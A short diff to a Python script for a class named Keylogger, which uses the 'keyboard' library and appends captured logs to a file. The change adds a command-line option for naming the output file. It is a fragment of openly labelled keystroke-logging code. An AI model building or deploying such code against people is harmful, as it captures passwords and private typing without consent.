@@ -1,17 +1,16 @@
+import argparse
 import keyboard
 import os
 from threading import Semaphore, Timer
 
+parser = argparse.ArgumentParser()
+parser.add_argument("-o","--output",required=True,help="Name of the output file")
+args = vars(parser.parse_args())
 
-'''
-  TODO
-  [x] create a global variable to store logs
-  [ ] create a write out object
-'''
 class Keylogger():
   def __init__(self):
     self.log = ""
-    self.out = open("output.txt","a")
+    self.out = open(args["output"],"a")
     self.Semaphore = Semaphore(0)
 
   def callback(self,event):
